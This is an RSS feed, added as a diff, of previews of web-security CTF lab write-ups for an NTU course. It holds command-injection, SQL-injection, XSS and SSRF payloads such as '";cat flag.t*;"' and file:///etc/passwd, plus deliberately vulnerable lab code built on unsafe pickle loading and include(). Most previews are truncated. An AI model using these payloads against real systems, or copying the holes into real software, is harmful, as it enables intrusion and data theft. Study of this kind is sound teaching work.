@@ -1,0 +1,734 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>SBK Hugo Site</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/</link><description>Recent content on SBK Hugo Site</description><generator>Hugo</generator><language>en-us</language><atom:link href="https://bernie6401.github.io/docs/security/course/ntu-cs/web/index.xml" rel="self" type="application/rss+xml"/><item><title>NTU CS 2023 HW4 Write Up</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/ntu-cs-2023-hw4-write-up/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/ntu-cs-2023-hw4-write-up/</guid><description>&lt;h1 id="ntu-cs-2023-hw4-write-up">
+ NTU CS 2023 HW4 Write Up
+ &lt;a class="anchor" href="#ntu-cs-2023-hw4-write-up">#&lt;/a>
+&lt;/h1>
+&lt;h2 id="lab-cat-shop">
+ Lab-Cat Shop
+ &lt;a class="anchor" href="#lab-cat-shop">#&lt;/a>
+&lt;/h2>
+&lt;p>Flag: &lt;code>FLAG{omg_y0u_hack3d_th3_c4t_sh0p!}&lt;/code>&lt;/p>
+&lt;h3 id="解題流程與思路">
+ 解題流程與思路
+ &lt;a class="anchor" href="#%e8%a7%a3%e9%a1%8c%e6%b5%81%e7%a8%8b%e8%88%87%e6%80%9d%e8%b7%af">#&lt;/a>
+&lt;/h3>
+&lt;ol>
+&lt;li>這一題很簡單，只要觀察送出的封包就可以知道每一個品項都是按照順序的(可預期的號碼)，所以只要把品項改成我們要的就可以成功query，如下圖，原本FLAG的column反白無法點選
+&lt;img src="https://hackmd.io/_uploads/SJ3bD8x_T.png" alt="圖片" />
+但因為送出的item number可預期，所以還是能夠正常query
+&lt;img src="https://hackmd.io/_uploads/HJ6yDUe_a.png" alt="圖片" />&lt;/li>
+&lt;li>接著看下一個packet就知道連我們的餘額以及支付金額都是裸奔的狀態，所以可以直接更改拿到flag
+&lt;img src="https://hackmd.io/_uploads/Sko9wLldp.png" alt="圖片" />
+&lt;img src="https://hackmd.io/_uploads/S1CovLldp.png" alt="圖片" />&lt;/li>
+&lt;/ol>
+&lt;h2 id="lab-dns-lookuper">
+ Lab-DNS Lookuper
+ &lt;a class="anchor" href="#lab-dns-lookuper">#&lt;/a>
+&lt;/h2>
+&lt;p>Flag: FLAG{Y0U_$(Byp4ssed)_th3_`waf`}&lt;/p>
+&lt;h3 id="解題流程與思路-1">
+ 解題流程與思路
+ &lt;a class="anchor" href="#%e8%a7%a3%e9%a1%8c%e6%b5%81%e7%a8%8b%e8%88%87%e6%80%9d%e8%b7%af-1">#&lt;/a>
+&lt;/h3>
+&lt;p>Use &lt;font color="FF0000">&lt;strong>&lt;code>$&lt;/code>&lt;/strong> or &lt;strong>`&lt;/strong>&lt;/font> string to bypass blacklist
+Payload:
+&lt;code>'$(cat /fla*)'&lt;/code>
+&lt;code>'&lt;/code>cat /fl*g*&lt;code>'&lt;/code>&lt;/p>
+&lt;h2 id="lab-log-me-in">
+ Lab-Log me in
+ &lt;a class="anchor" href="#lab-log-me-in">#&lt;/a>
+&lt;/h2>
+&lt;p>Flag: &lt;code>FLAG{b4by_sql_inj3cti0n}&lt;/code>&lt;/p>
+&lt;h3 id="解題流程與思路-2">
+ 解題流程與思路
+ &lt;a class="anchor" href="#%e8%a7%a3%e9%a1%8c%e6%b5%81%e7%a8%8b%e8%88%87%e6%80%9d%e8%b7%af-2">#&lt;/a>
+&lt;/h3>
+&lt;ul>
+&lt;li>Payload → &lt;code>') or ('1'='1') -- #&lt;/code>
+SELECT * FROM admin WHERE (username=&amp;rsquo;&amp;rsquo;) or (&amp;lsquo;1&amp;rsquo;=&amp;lsquo;1&amp;rsquo;) &amp;ndash; #&amp;rsquo;) AND (password=&amp;lsquo;MTIz&amp;rsquo;)&lt;/li>
+&lt;/ul>
+&lt;h2 id="lab-jinja2-ssti">
+ Lab-Jinja2 SSTI
+ &lt;a class="anchor" href="#lab-jinja2-ssti">#&lt;/a>
+&lt;/h2>
+&lt;p>Flag: &lt;code>FLAG{ssti.__class__.__pwn__}&lt;/code>&lt;/p></description></item><item><title>Simple Web - 0x02(Lab - Whois Tool)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x02lab---whois-tool/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x02lab---whois-tool/</guid><description>&lt;h1 id="simple-web---0x02lab---whois-tool">
+ Simple Web - 0x02(Lab - Whois Tool)
+ &lt;a class="anchor" href="#simple-web---0x02lab---whois-tool">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ctf-web-eductf">
+ tags: &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code> &lt;code>eductf&lt;/code>
+ &lt;a class="anchor" href="#tags-ctf-web-eductf">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="https://whoistool.ctf.zoolab.org/">https://whoistool.ctf.zoolab.org/&lt;/a>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>Almost the same as &lt;a href="https://bernie6401.github.io/7x0Gr0C_QEahfS_QaTLYTg">0x10(Lab - DNS Lookup Tool | WAF)&lt;/a>&lt;/p>
+&lt;h2 id="source-code">
+ Source Code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
+if(isset($_GET[&amp;#34;host&amp;#34;])){
+ $host = $_GET[&amp;#34;host&amp;#34;];
+ if(strlen($host) &amp;gt; 15)
+ echo &amp;#34;Host name tooooooo logn!!&amp;#34;;
+ else
+ echo `whois &amp;#34;{$host}&amp;#34; 2&amp;gt;&amp;amp;1;`;
+}
+?&amp;gt;
+&lt;/code>&lt;/pre>&lt;h2 id="exploit">
+ Exploit
+ &lt;a class="anchor" href="#exploit">#&lt;/a>
+&lt;/h2>
+&lt;p>Payload: &lt;code>&amp;quot;;ls -al;&amp;quot;&lt;/code>
+&lt;img src="https://i.imgur.com/MsG3wOH.png" alt="" />
+Payload: &lt;code>&amp;quot;;cat flag.t*;&amp;quot;&lt;/code>
+Then we got flag!!!&lt;/p></description></item><item><title>Simple Web - 0x03(Lab - Normal Login Panel (Flag 1))</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x03lab---normal-login-panel-flag-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x03lab---normal-login-panel-flag-1/</guid><description>&lt;h1 id="simple-web---0x03lab---normal-login-panel-flag-1">
+ Simple Web - 0x03(Lab - Normal Login Panel (Flag 1))
+ &lt;a class="anchor" href="#simple-web---0x03lab---normal-login-panel-flag-1">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ctf-web-eductf">
+ tags: &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code> &lt;code>eductf&lt;/code>
+ &lt;a class="anchor" href="#tags-ctf-web-eductf">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="https://login.ctf.zoolab.org/">https://login.ctf.zoolab.org/&lt;/a>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;h2 id="source-code">
+ Source Code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;h3 id="analysis">
+ Analysis
+ &lt;a class="anchor" href="#analysis">#&lt;/a>
+&lt;/h3>
+&lt;h2 id="exploit---sqli">
+ Exploit - SQLi
+ &lt;a class="anchor" href="#exploit---sqli">#&lt;/a>
+&lt;/h2>
+&lt;h3 id="easy-way---sqlmap">
+ Easy way - &lt;code>SQLmap&lt;/code>
+ &lt;a class="anchor" href="#easy-way---sqlmap">#&lt;/a>
+&lt;/h3>
+&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ ./sqlmap.py &amp;#34;https://login.ctf.zoolab.org/&amp;#34; --form -dbs sqlite --dump --risk=3 --level=5
+...
+---
+Parameter: username (POST)
+ Type: time-based blind
+ Title: SQLite &amp;gt; 2.0 AND time-based blind (heavy query)
+ Payload: username=&amp;#39;||(SELECT CHAR(116,86,90,89) WHERE 7681=7681 AND 7766=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))))||&amp;#39;&amp;amp;password=
+---
+&lt;/code>&lt;/pre>&lt;h3 id="hard-way---tryerror">
+ Hard way - try&amp;amp;error
+ &lt;a class="anchor" href="#hard-way---tryerror">#&lt;/a>
+&lt;/h3>
+&lt;ol>
+&lt;li>
+&lt;p>Check if it has &lt;code>sqli&lt;/code> problem
+Payload: &lt;code>union'&lt;/code>
+&lt;img src="https://i.imgur.com/xIfsghR.png" alt="" />&lt;/p></description></item><item><title>Simple Web - 0x04(Lab - Normal Login Panel (Flag 2))</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x04lab---normal-login-panel-flag-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x04lab---normal-login-panel-flag-2/</guid><description>&lt;h1 id="simple-web---0x04lab---normal-login-panel-flag-2">
+ Simple Web - 0x04(Lab - Normal Login Panel (Flag 2))
+ &lt;a class="anchor" href="#simple-web---0x04lab---normal-login-panel-flag-2">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ctf-web-eductf">
+ tags: &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code> &lt;code>eductf&lt;/code>
+ &lt;a class="anchor" href="#tags-ctf-web-eductf">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="https://login.ctf.zoolab.org/">https://login.ctf.zoolab.org/&lt;/a>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;a href="https://youtu.be/_hasOTGximc?t=5863">Web Security 0x1&lt;/a>&lt;/p>
+&lt;h2 id="source-code">
+ Source Code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;p>:::spoiler code&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">from flask import Flask, request, render_template, render_template_string, send_file
+from flask_sqlalchemy import SQLAlchemy
+
+db = SQLAlchemy()
+app = Flask(__name__)
+app.config[&amp;#34;SQLALCHEMY_DATABASE_URI&amp;#34;] = &amp;#34;sqlite:///app.db&amp;#34;
+db.init_app(app)
+
+with app.app_context():
+ db.session.execute(&amp;#34;&amp;#34;&amp;#34;
+ CREATE TABLE IF NOT EXISTS users(
+ id Integer PRIMARY KEY,
+ username String NOT NULL UNIQUE,
+ password String,
+ count Integer DEFAULT 0
+ );
+ &amp;#34;&amp;#34;&amp;#34;)
+ db.session.execute(&amp;#34;INSERT OR REPLACE INTO users (username, password) VALUES (&amp;#39;admin&amp;#39;, &amp;#39;FLAG{Un10N_s31eCt/**/F14g_fR0m_s3cr3t}&amp;#39;)&amp;#34;)
+ db.session.commit()
+
+def login(greet):
+ if not greet:
+ return send_file(&amp;#39;app.py&amp;#39;, mimetype=&amp;#39;text/plain&amp;#39;)
+ else:
+ return render_template_string(f&amp;#34;Hello {greet}&amp;#34;)
+
+@app.route(&amp;#39;/&amp;#39;, methods=[&amp;#34;GET&amp;#34;, &amp;#34;POST&amp;#34;])
+def index():
+ if request.method == &amp;#34;GET&amp;#34;:
+ return render_template(&amp;#39;index.html&amp;#39;)
+ else:
+ username = request.form.get(&amp;#39;username&amp;#39;, &amp;#39;&amp;#39;)
+ password = request.form.get(&amp;#39;password&amp;#39;, &amp;#39;&amp;#39;)
+ error = &amp;#39;&amp;#39;
+ user = db.session.execute(&amp;#34;SELECT username, password FROM users where username=:username&amp;#34;, {&amp;#34;username&amp;#34;:username}).first()
+
+ if user and user[1] == password:
+ return login(request.form.get(&amp;#39;greet&amp;#39;, &amp;#39;&amp;#39;))
+ elif not user:
+ error += &amp;#34;User doesn&amp;#39;t exist! &amp;#34;
+
+ # New feature! count login failed event
+ db.session.execute(&amp;#34;UPDATE users SET count = count + 1 WHERE username=:username&amp;#34;, {&amp;#34;username&amp;#34;: username})
+ db.session.commit()
+ count = db.session.execute(f&amp;#34;SELECT * FROM users WHERE username=&amp;#39;{username}&amp;#39;&amp;#34;).first() or [0, 0, 0, 0]
+ error += f&amp;#39;Login faild count: {count[3]}&amp;#39;
+
+ return render_template(&amp;#39;index.html&amp;#39;, error=error)
+
+
+if __name__ == &amp;#34;__main__&amp;#34;:
+ app.run(host=&amp;#34;0.0.0.0&amp;#34;)
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web - 0x08(Lab - `Particles.js`)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x08lab---particles.js/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x08lab---particles.js/</guid><description>&lt;h1 id="simple-web---0x08lab---particlesjs">
+ Simple Web - 0x08(Lab - &lt;code>Particles.js&lt;/code>)
+ &lt;a class="anchor" href="#simple-web---0x08lab---particlesjs">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ctf-web-eductf">
+ tags: &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code> &lt;code>eductf&lt;/code>
+ &lt;a class="anchor" href="#tags-ctf-web-eductf">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="https://particles.ctf.zoolab.org">https://particles.ctf.zoolab.org&lt;/a>&lt;/p>
+&lt;h2 id="description">
+ Description
+ &lt;a class="anchor" href="#description">#&lt;/a>
+&lt;/h2>
+&lt;p>The website can change the theme of layout. The main goal is to leak admin&amp;rsquo;s cookie.&lt;/p>
+&lt;h2 id="source-code">
+ Source Code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;h3 id="analysis">
+ Analysis
+ &lt;a class="anchor" href="#analysis">#&lt;/a>
+&lt;/h3>
+&lt;h2 id="exploit---xss">
+ Exploit - XSS
+ &lt;a class="anchor" href="#exploit---xss">#&lt;/a>
+&lt;/h2>
+&lt;ol>
+&lt;li>
+&lt;p>Use burp suit to check if the website has XSS vulnerability.
+&lt;img src="https://i.imgur.com/eu4Qqrs.png" alt="" />&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Try to modify &lt;code>config&lt;/code> parameter
+Payload 1: &lt;code>1;alert(123);console.log({x://\&lt;/code>
+:::spoiler Response 1&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-javascript!" data-lang="javascript!">...
+&amp;lt;script&amp;gt;
+ url.value = location; config.value = &amp;#39;1;
+ alert(123);
+ console.log({x://\&amp;#39;; fetch(&amp;#39;/1;alert(123);console.log({x://\.json&amp;#39;).then(r =&amp;gt; r.json()).then(json =&amp;gt; {
+ particlesJS(&amp;#34;particles-js&amp;#34;, json)
+ })
+&amp;lt;/script&amp;gt;
+...
+&lt;/code>&lt;/pre>&lt;p>:::
+or
+Payload 2: &lt;code>&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;alert(123);&amp;lt;/script&amp;gt;&lt;/code>
+:::spoiler Response 2&lt;/p></description></item><item><title>Simple Web - 0x09(Lab - Simple Note)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x09lab---simple-note/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x09lab---simple-note/</guid><description>&lt;h1 id="simple-web---0x09lab---simple-note">
+ Simple Web - 0x09(Lab - Simple Note)
+ &lt;a class="anchor" href="#simple-web---0x09lab---simple-note">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ctf-web-eductf">
+ tags: &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code> &lt;code>eductf&lt;/code>
+ &lt;a class="anchor" href="#tags-ctf-web-eductf">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="https://note.ctf.zoolab.org/">https://note.ctf.zoolab.org/&lt;/a>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;a href="https://www.wibibi.com/info.php?tid=402">&lt;/a>&lt;/p>
+&lt;h2 id="source-code">
+ Source Code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;pre tabindex="0">&lt;code class="language-javascript!" data-lang="javascript!">...
+&amp;lt;script&amp;gt;
+ const id = location.pathname.split(&amp;#39;/&amp;#39;).pop();
+
+ fetch(`/api/note/${id}`).then(r =&amp;gt; r.json()).then(({ title, content })=&amp;gt;{
+ url.value = location;
+ titleNode.innerHTML = title;
+ contentNode.innerText = content;
+ }); 
+&amp;lt;/script&amp;gt;
+...
+&lt;/code>&lt;/pre>&lt;p>For instance, if our &lt;code>$id=47a8aad1b3b82dcd4decd36d&lt;/code>, the &lt;code>script code&lt;/code> will fetch this data as &lt;code>json&lt;/code> file and parse title and content.
+&lt;img src="https://i.imgur.com/Nwj6gCQ.png" alt="" />
+Then it&amp;rsquo;ll change &lt;code>titleNode&lt;/code> by &lt;code>innerHTML&lt;/code> and change &lt;code>contentNode&lt;/code> by &lt;code>innerText&lt;/code>.
+&lt;img src="https://i.imgur.com/H8VdiIb.png" alt="" />&lt;/p></description></item><item><title>Simple Web 0x01(Lab - Hello from Windows 98)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x01lab---hello-from-windows-98/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x01lab---hello-from-windows-98/</guid><description>&lt;h1 id="simple-web-0x01lab---hello-from-windows-98">
+ Simple Web 0x01(Lab - Hello from Windows 98)
+ &lt;a class="anchor" href="#simple-web-0x01lab---hello-from-windows-98">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ctf-web-eductf">
+ tags: &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code> &lt;code>eductf&lt;/code>
+ &lt;a class="anchor" href="#tags-ctf-web-eductf">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="https://windows.ctf.zoolab.org/">https://windows.ctf.zoolab.org/&lt;/a>&lt;/p>
+&lt;p>Very similar to &lt;a href="https://bernie6401.github.io/nGAjlvyURtOcRBW1XfCfOA">0x07(Lab - &lt;code>HakkaMD&lt;/code>)&lt;/a>&lt;/p>
+&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;p>:::spoiler code&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-php!=" data-lang="php!="> &amp;lt;?php
+ session_start();
+ if(isset($_GET[&amp;#39;source&amp;#39;])){
+ highlight_file(&amp;#39;./&amp;#39;.$_GET[&amp;#39;source&amp;#39;].&amp;#39;.php&amp;#39;);
+ die();
+ }
+ if(isset($_GET[&amp;#39;name&amp;#39;]) &amp;amp;&amp;amp; $_GET[&amp;#39;name&amp;#39;]!=&amp;#39;&amp;#39;){
+ $_SESSION[&amp;#39;name&amp;#39;] = $_GET[&amp;#39;name&amp;#39;];
+ header(&amp;#34;Location: /?page=hi.php&amp;#34;);
+ die();
+ }
+ if(!isset($_GET[&amp;#39;page&amp;#39;])){
+ header(&amp;#34;Location: /?page=say.php&amp;#34;);
+ die();
+ }
+?&amp;gt;
+&amp;lt;!DOCTYPE html&amp;gt;
+&amp;lt;html&amp;gt;
+&amp;lt;head&amp;gt;
+ &amp;lt;title&amp;gt;Hello from Windows 98&amp;lt;/title&amp;gt;
+ &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34; /&amp;gt;
+ &amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;https://unpkg.com/98.css&amp;#34; /&amp;gt;
+&amp;lt;/head&amp;gt;
+&amp;lt;style&amp;gt;
+ body{
+ background: url(&amp;#39;blue.png&amp;#39;);
+ background-size: cover;
+ display: flex;
+ align-items: center;
+ justify-content: center;
+ height: 100vh;
+ margin: 0;
+ }
+&amp;lt;/style&amp;gt;
+&amp;lt;/style&amp;gt;
+&amp;lt;body&amp;gt;
+ &amp;lt;div class=&amp;#34;window&amp;#34; style=&amp;#34;margin: 32px; width: 500px&amp;#34;&amp;gt;
+ &amp;lt;div class=&amp;#34;title-bar&amp;#34;&amp;gt;
+ &amp;lt;div class=&amp;#34;title-bar-text&amp;#34;&amp;gt;
+ Hello World..
+ &amp;lt;/div&amp;gt;
+ &amp;lt;div class=&amp;#34;title-bar-controls&amp;#34;&amp;gt;
+ &amp;lt;button aria-label=&amp;#34;Minimize&amp;#34;&amp;gt;&amp;lt;/button&amp;gt;
+ &amp;lt;button aria-label=&amp;#34;Maximize&amp;#34;&amp;gt;&amp;lt;/button&amp;gt;
+ &amp;lt;button aria-label=&amp;#34;Close&amp;#34;&amp;gt;&amp;lt;/button&amp;gt;
+ &amp;lt;/div&amp;gt;
+ &amp;lt;/div&amp;gt;
+ &amp;lt;div class=&amp;#34;window-body&amp;#34;&amp;gt;
+ &amp;lt;?php include($_GET[&amp;#39;page&amp;#39;]);?&amp;gt;
+ &amp;lt;/div&amp;gt;
+ &amp;lt;/div&amp;gt;
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x12(Lab - Web Preview Card)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x15lab---web-preview-card/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x15lab---web-preview-card/</guid><description>&lt;h1 id="simple-web-0x12lab---web-preview-card">
+ Simple Web 0x12(Lab - Web Preview Card)
+ &lt;a class="anchor" href="#simple-web-0x12lab---web-preview-card">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ntustws-ctf-web">
+ tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8500/">http://h4ck3r.quest:8500/&lt;/a>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;a href="https://youtu.be/hWC-Evt-sBc?t=6136">Web Hacking | 續章【EDU-CTF 2021】&lt;/a>
+&lt;a href="https://medium.com/%e7%a8%8b%e5%bc%8f%e7%8c%bf%e5%90%83%e9%a6%99%e8%95%89/%e7%b6%b2%e7%ab%99%e5%ae%89%e5%85%a8-%e4%bc%ba%e6%9c%8d%e5%99%a8%e8%ab%8b%e6%b1%82%e5%81%bd%e9%80%a0-ssrf-%e6%94%bb%e6%93%8a-%e9%a0%85%e8%8e%8a%e8%88%9e%e5%8a%8d-%e6%84%8f%e5%9c%a8%e6%b2%9b%e5%85%ac-7a5524926362">網站安全🔒 伺服器端請求偽造 SSRF 攻擊 — 「項莊舞劍，意在沛公」&lt;/a>&lt;/p>
+&lt;h2 id="exploit---ssrf">
+ Exploit - SSRF
+ &lt;a class="anchor" href="#exploit---ssrf">#&lt;/a>
+&lt;/h2>
+&lt;p>When you see a preview function, then it may have SSRF problem.&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>Test it
+&lt;code>file:///etc/passwd&lt;/code> or &lt;code>http://127.0.0.1&lt;/code>
+&lt;img src="https://i.imgur.com/NKbIlDT.png" alt="" />&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Analyze &lt;code>flag.php&lt;/code>
+&lt;img src="https://i.imgur.com/OGo7biu.png" alt="" />
+:::spoiler source code&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
+if ($_SERVER[&amp;#39;REMOTE_ADDR&amp;#39;] !== &amp;#39;127.0.0.1&amp;#39;) die(&amp;#34;Only for localhost user.&amp;#34;);
+?&amp;gt;
+&amp;lt;form action=&amp;#34;/flag.php&amp;#34; method=&amp;#34;post&amp;#34;&amp;gt;
+ Do you want the FLAG? &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;givemeflag&amp;#34; value=&amp;#34;no&amp;#34;&amp;gt;
+ &amp;lt;input type=&amp;#34;submit&amp;#34;&amp;gt;
+&amp;lt;/form&amp;gt;
+&amp;lt;?php
+if (isset($_POST[&amp;#39;givemeflag&amp;#39;]) &amp;amp;&amp;amp; $_POST[&amp;#39;givemeflag&amp;#39;] === &amp;#39;yes&amp;#39;)
+ echo &amp;#34;FLAG:&amp;#34;, getenv(&amp;#39;FLAG&amp;#39;);
+&lt;/code>&lt;/pre>&lt;p>:::
+If you want flag, you need visit &lt;code>/flag.php&lt;/code> as localhost and send a form data with parameter &lt;code>givemeflag&lt;/code>.&lt;/p></description></item><item><title>Simple Web 0x16(Lab - Pickle)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x11lab---pickle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x11lab---pickle/</guid><description>&lt;h1 id="simple-web-0x16lab---pickle">
+ Simple Web 0x16(Lab - Pickle)
+ &lt;a class="anchor" href="#simple-web-0x16lab---pickle">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ntustws-ctf-web">
+ tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8600/">http://h4ck3r.quest:8600/&lt;/a>
+Note: open a brand new window that haven&amp;rsquo;t login &lt;code>http://h4ck3r.quest&lt;/code>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;a href="https://bernie6401.github.io/IcoQql7UQiegLv8KtK2wOw">0x15.5(Pickle)&lt;/a>&lt;/p>
+&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;p>:::spoiler code&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-pyton=" data-lang="pyton=">from flask import Flask, request, make_response, redirect, send_file
+import base64
+import pickle
+
+app = Flask(__name__)
+
+
+@app.route(&amp;#34;/sauce&amp;#34;)
+def sauce():
+ return send_file(__file__, mimetype=&amp;#34;text/plain&amp;#34;)
+
+
+@app.route(&amp;#34;/&amp;#34;)
+def main():
+ session = request.cookies.get(&amp;#34;session&amp;#34;)
+ if session == None:
+ return &amp;#39;&amp;lt;form action=&amp;#34;/login&amp;#34; method=&amp;#34;POST&amp;#34;&amp;gt;&amp;#39; +\
+ &amp;#39;&amp;lt;p&amp;gt;Name: &amp;lt;input name=&amp;#34;name&amp;#34; type=&amp;#34;text&amp;#34;&amp;gt;&amp;lt;/p&amp;gt;&amp;#39; +\
+ &amp;#39;&amp;lt;p&amp;gt;Age: &amp;lt;input name=&amp;#34;age&amp;#34; type=&amp;#34;number&amp;#34;&amp;gt;&amp;lt;/p&amp;gt;&amp;#39; +\
+ &amp;#39;&amp;lt;button&amp;gt;Submit&amp;lt;/button&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;hr&amp;gt;&amp;lt;a href=&amp;#34;/sauce&amp;#34;&amp;gt;Source code&amp;lt;/a&amp;gt;&amp;#39;
+
+ else:
+ user = pickle.loads(base64.b64decode(session))
+ return f&amp;#39;&amp;lt;p&amp;gt;Name: {user[&amp;#34;name&amp;#34;]}&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;Age: {user[&amp;#34;age&amp;#34;]}&amp;lt;/p&amp;gt;&amp;#39;
+
+
+@app.route(&amp;#34;/login&amp;#34;, methods=[&amp;#39;POST&amp;#39;])
+def login():
+ user = base64.b64encode(pickle.dumps({
+ &amp;#34;name&amp;#34;: request.form.get(&amp;#39;name&amp;#39;),
+ &amp;#34;age&amp;#34;: int(request.form.get(&amp;#39;age&amp;#39;))
+ }))
+ resp = make_response(redirect(&amp;#39;/&amp;#39;))
+ resp.set_cookie(&amp;#34;session&amp;#34;, user)
+ return resp
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x17(Lab - Baby Cat)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x12lab---baby-cat/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x12lab---baby-cat/</guid><description>&lt;h1 id="simple-web-0x17lab---baby-cat">
+ Simple Web 0x17(Lab - Baby Cat)
+ &lt;a class="anchor" href="#simple-web-0x17lab---baby-cat">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ntustws-ctf-web">
+ tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
